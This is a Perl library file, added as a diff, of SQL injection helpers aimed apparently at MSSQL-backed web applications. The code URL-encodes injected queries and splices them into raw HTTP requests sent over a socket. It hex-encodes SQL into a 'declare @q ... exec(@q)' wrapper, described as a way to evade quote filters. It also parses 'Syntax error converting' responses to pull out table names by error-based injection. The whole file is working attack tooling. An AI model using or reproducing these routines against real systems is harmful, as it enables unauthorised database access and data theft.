@@ -1,0 +1,129 @@
+# SQL injection functions 
+#
+# This file contains basic 
+# send and extract modules.
+# Some encoding modules are
+# in but not implemented
+
+
+sub sendsqlattack{
+
+@vars = @_;
+	
+
+	my	$host=$vars[0];
+	my	$query=$vars[1];
+	my	$request=$vars[2];
+		$port=$vars[3];	
+		$target = inet_aton($host);
+
+$query=~s/\+/%2b/g;
+	$query=~s/ /+/g;
+
+$query=~s/\;/%3b/g;
+$query=~s/,/%2c/g;
+
+$query=~s/=/%3d/g;
+	$query=~s/\@/%40/g;
+	$query=~s/\(/%28/g;
+	$query=~s/\)/%29/g;
+	$query=~s/#/%23/g;
+	$query=~s/'/%27/g;
+	$query=~s/>/%3E/g;
+	$query=~s/</%3C/g;
+	$query=~s/:/%3A/g;
+	$query=~s/\\/%5C/g;
+#print $query;
+	$request=~s/QUERYHERE/$query/g;	# insert SQL;
+	
+		$query_copy=$query; chomp $query_copy;
+		$pst_len=length($query_copy);		# Inserts length of post for POSTS
+		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
+		$pst_len=$pst_len - 9;			# alinement. PLEASE CHECK THIS
+		$request=~s/REPLACEME/$pst_len/g;	# 
+
+#print "request:\n$request\n\n\n";
+@results = sendraw($request);
+#print "results:\n@results\n\n\n";
+$err= extract_error(@results); # extract error value and place in $err
+
+}
+
+
+sub doencode{
+
+@vars1=@_;		# SUB to encode SQL to avoid quote filter
+$qry= $vars1[0];
+$hardcoded_sql=
+
+	'declare @q varchar(8000) '.
+	'select @q=0x*** '.
+	'exec(@q)';
+
+	$prepared = encode_sql($qry);
+	$hardcoded_sql =~s/\*\*\*/$prepared/g;
+
+return $hardcoded_sql;
+
+}
+
+
+sub encode_sql{		#Sub to encode SQL
+	@subvar=@_;
+	my $sqlstr =$subvar[0];
+	@ASCII = unpack("C*", $sqlstr);
+	foreach $line (@ASCII) {
+
+		$encoded =  sprintf('%lx',$line);
+		$encoded_command .= $encoded;
+	
+			}
+return $encoded_command;
+
+}
+
+
+# Sub to extract standard MSSQL errors using
+# the or 1 in (SQL) technique
+
+sub extract_error{
+
+@eevars=@_;
+
+#$marker="ODBC SQL Server Driver";
+$marker="Syntax error converting";
+	
+
+foreach $line(@eevars){
+
+if ($line =~ $marker)
+			
+		{
+#print "found marker\n";
+		($crap,$good)=split(/varchar value '/,$line);	
+		($good2,$crap)=split(/' to a column of data type int./,$good);
+		$tablename=$good2;
+		#open(OUT,">>tables.txt");
+		#print OUT "$good2\n";
+		#close OUT;
+	return $good2 ."\n";
+		}
+	}
+}
+
+
+
+sub sendraw {   # this saves the whole transaction anyway
+
+	my ($pstr)=@_;
+	socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+		die("Socket problems\n");
+	if(connect(S,pack "SnA4x8",2,$port,$target)){
+		my @in;
+		select(S);      $|=1;   print $pstr;
+		while(<S>){ push @in, $_;}
+		select(STDOUT); close(S); return @in;
+	} else { die("Can't connect...\n"); }
+}
+
+return 1;
